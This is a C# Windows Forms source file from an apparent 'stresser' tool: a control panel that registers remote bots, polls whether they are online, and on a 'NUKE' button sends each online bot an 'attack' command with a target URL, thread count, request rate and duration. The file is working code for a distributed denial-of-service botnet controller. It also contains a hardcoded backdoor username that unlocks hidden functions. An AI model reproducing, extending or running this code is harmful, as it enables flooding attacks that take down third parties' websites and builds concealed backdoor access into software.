using StresserWinGUI.Helpers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace StresserWinGUI.Forms
{
    public partial class FrmMain : Form
    {
        public FrmMain()
        {
            InitializeComponent();
        }
        public static string url;
        public static string threads;
        public static string token;
        public static string rstp;
        public static string botName;

        public static string target_u;
        public static string target_s;
        private void navbar_Paint(object sender, PaintEventArgs e)
        {

        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            FrmAlert x = new FrmAlert();
            if (FrmLogin.username == "NaysKutzu")
            {
                Program.hLogger.Log(LogType.Warning, "Detected a backdoor account!!");
                Program.hLogger.Log(LogType.Warning, "Showing hidden functions!!");
                x.showAlert("User is a backdoor account!", FrmAlert.enmType.Warning);
            }
            PopulateBotsList();
        }

        private void btnAddNewBot_Click(object sender, EventArgs e)
        {
            FrmAlert x = new FrmAlert();
            InputHelper nameForm = new InputHelper("Bot Name", "New Bot Name");
            nameForm.FormClosed += (s0, args0) =>
            {
                FrmMain.botName = InputHelper.input; // Assign the inputted name to botName

                // Now proceed with getting other inputs (URL, Threads, RP(S), Token)
                InputHelper inpturl = new InputHelper("URL", "New Bot");
                inpturl.FormClosed += (s1, args1) =>
                {
                    FrmMain.url = InputHelper.input;

                    InputHelper threadsgui = new InputHelper("Threads", "New Bot");
                    threadsgui.FormClosed += (s2, args2) =>
                    {
                        FrmMain.threads = InputHelper.input;

                        InputHelper rstps_form = new InputHelper("RP(S)", "New Bot");
                        rstps_form.FormClosed += (s3, args3) =>
                        {
                            FrmMain.rstp = InputHelper.input;

                            InputHelper token_form = new InputHelper("Token", "New Bot");
                            token_form.FormClosed += async (s4, args4) =>
                            {
                                FrmMain.token = InputHelper.input;

                                MessageBox.Show($"Data:\n" +
                                    $"BOT NAME: {FrmMain.botName}\n" +
                                    $"BOT URL: {FrmMain.url}\n" +
                                    $"TOKEN: {FrmMain.token}\n" +
                                    $"RPS: {FrmMain.rstp}\n" +
                                    $"THREADS: {FrmMain.threads}");

                                try
                                {
                                    if (await tryConnection(FrmMain.url) == true)
                                    {
                                        MessageBox.Show("Success");
                                        BotSettingsManager.CreateBot(FrmMain.botName, FrmMain.url, FrmMain.threads, FrmMain.rstp, FrmMain.token);
                                        PopulateBotsList();
                                    }
                                    else
                                    {
                                        MessageBox.Show("Failed to connect to the URL");
                                    }
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show($"Error: {ex.Message}");
                                }
                            };
                            token_form.Show();
                        };
                        rstps_form.Show();
                    };
                    threadsgui.Show();
                };
                inpturl.Show();
            };
            nameForm.Show();

        }
        private async void PopulateBotsList()
        {
            try
            {
                Dictionary<string, string> bots = BotSettingsManager.GetAllBots();
                lstBots.Items.Clear();
                foreach (var bot in bots)
                {
                    string botName = bot.Key;
                    string domain = ExtractDomainFromBotValue(bot.Value);
                    bool isConnected = await tryConnection(domain);
                    string status = isConnected ? "Online" : "Offline";

                    lstBots.Items.Add($"{botName} | [{status}]");
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }
        }

        private string ExtractDomainFromBotValue(string botValue)
        {
            string[] parts = botValue.Split(';');
            string domainPart = parts.FirstOrDefault(p => p.Trim().StartsWith("Domain="));
            if (domainPart != null)
            {
                return domainPart.Substring(7); // Remove "URL=" prefix
            }
            return "";
        }


        public static async Task<bool> tryConnection(string url)
        {
            var client = new HttpClient();
            var request = new HttpRequestMessage
            {
                Method = HttpMethod.Post,
                RequestUri = new Uri(url),
                Headers =
        {
            { "Authorization", "test" },
            { "User-Agent", "insomnia/8.6.1" },
        },
                Content = new MultipartFormDataContent
                {
                      new StringContent("status")
        {
            Headers =
            {
                ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "action",
                }
            }
        }

                },
            };


            using (var response = await client.SendAsync(request))
            {
                response.EnsureSuccessStatusCode();
                var body = await response.Content.ReadAsStringAsync();
                Console.WriteLine(body);

                // Check if the response is as expected
                var jsonResponse = JsonSerializer.Deserialize<Dictionary<string, string>>(body);
                return jsonResponse != null && jsonResponse.ContainsKey("status") && jsonResponse["status"] == "OK";
            }
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            InputHelper nameForm = new InputHelper("Bot Name", "New Bot Name");
            nameForm.FormClosed += (s0, args0) =>
            {
                FrmMain.botName = InputHelper.input;
                BotSettingsManager.DeleteBot(FrmMain.botName);
                PopulateBotsList();
            };
            nameForm.Show();
        }

        private void btnrefresh_Click(object sender, EventArgs e)
        {
            PopulateBotsList();
        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("This will send all bots that are online in the list to the target!!\nAre you sure you want to do this?", "WAIT", MessageBoxButtons.YesNo, MessageBoxIcon.Hand);

            if (result == DialogResult.Yes)
            {
                InputHelper target_frm = new InputHelper("Target URL", "NUKE");
                target_frm.FormClosed += (s0, args0) =>
                {
                    FrmMain.target_u = InputHelper.input; // Assign the inputted name to botName

                    InputHelper target_s = new InputHelper("TIME (Secounds)", "New Bot");
                    target_s.FormClosed += (s1, args1) =>
                    {
                        FrmMain.target_s = InputHelper.input;

                        DialogResult result2 = MessageBox.Show($"You are about to hit '{FrmMain.target_u}' with '" + BotSettingsManager.GetNumberOfBots + "'bot(s)!!! \nAre you sure about this??", "WAIT", MessageBoxButtons.YesNo, MessageBoxIcon.Hand);
                        if (result2 == DialogResult.Yes)
                        {
                            sendAttackToAllBots(FrmMain.target_u, FrmMain.target_s);
                        }
                        else
                        {
                            MessageBox.Show("Sure, that was crazy anyway");
                        }
                    };
                    target_s.Show();
                };
                target_frm.Show();
            }
            else if (result == DialogResult.No)
            {
                MessageBox.Show("Sure, that was crazy anyway");
            }
        }
        public static async Task sendAttackToAllBots(string targetUrl, string time)
        {
            try
            {
                Dictionary<string, string> bots = BotSettingsManager.GetAllBots();

                foreach (var bot in bots)
                {
                    string botName = bot.Key;
                    string botValue = bot.Value;

                    string[] parts = botValue.Split(';');
                    string domain = parts.FirstOrDefault(p => p.Trim().StartsWith("Domain="))?.Substring(7);
                    string threads = parts.FirstOrDefault(p => p.Trim().StartsWith("Threads="))?.Substring(8);
                    string rspt = parts.FirstOrDefault(p => p.Trim().StartsWith("Rspt="))?.Substring(5);
                    string token = parts.FirstOrDefault(p => p.Trim().StartsWith("Token="))?.Substring(6);

                    if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(threads) && !string.IsNullOrEmpty(rspt) && !string.IsNullOrEmpty(token))
                    {
                        // Check if the bot is online
                        if (await tryConnection(domain))
                        {
                            Console.WriteLine($"Bot '{botName}' is online. Starting attack.");
                            await sendAttack(botName, domain, targetUrl, threads, rspt, time, token);
                        }
                        else
                        {
                            Console.WriteLine($"Bot '{botName}' is offline. Skipping attack.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending attacks: {ex.Message}");
            }
        }

        public static async Task sendAttack(string botName, string domain, string targetUrl, string threads, string rspt, string time, string token)
        {
            var client = new HttpClient();
            var request = new HttpRequestMessage
            {
                Method = HttpMethod.Post,
                RequestUri = new Uri(domain), // Use the bot's domain as the attack endpoint
                Headers =
        {
            { "Authorization", token },
            { "User-Agent", "insomnia/8.6.1" },
        },
                Content = new MultipartFormDataContent
        {
            { new StringContent("attack"), "action" },
            { new StringContent(targetUrl), "domain" }, // Target URL for the attack
            { new StringContent(threads), "threads" },
            { new StringContent(rspt), "rspt" },
            { new StringContent(time), "time" },
            { new StringContent(token), "token" },
        },
            };

            using (var response = await client.SendAsync(request))
            {
                response.EnsureSuccessStatusCode();
                var body = await response.Content.ReadAsStringAsync();
                Console.WriteLine(body);
            }
        }

        private void lblclose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void lblminimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
